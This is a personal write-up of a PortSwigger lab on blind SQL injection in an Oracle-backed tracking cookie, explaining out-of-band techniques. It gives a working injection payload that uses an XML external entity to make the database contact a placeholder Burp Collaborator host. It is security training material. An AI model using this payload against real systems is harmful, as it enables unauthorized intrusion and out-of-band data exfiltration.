# Lab: Blind SQL injection with out-of-band interaction
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

## Disclaimer
**This room requires Burp Collaborator, which is only usably with Burp Suite Professional.**

So for me this lab is not solvable. But I will explain the idea behind the attack and the theoretical payload you could use.

## Out-of-band interaction
In this lab we can use a blind SQL injection, but there is no response by the application like conditional responses, error messages or time delays.

To still abuse this vulnerability, we can use out-of-band techniques. To shorten things up, you inject a query, which sends it's response, for example, as subdomain in a DNS request to an other server.

Burp Collaborator is a tool by Burp, which automates this technique in the Burp Suite interface.

## Solution
The injection takes place over the TrackingId cookie of the website again.

The goal is only to create an out-of-band interaction without any data extraction. We can do this by the following statement. The database is an Oracle DB (queries for different databases are listet in the [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)):
```
TrackingId=' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual) ||'
```

This query creates a DNS request to the collaborator server with the corresponding subdomain (http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net/). Burp Collaborator shows those on the server incoming requests in the interface.

The lab would be solved with this.
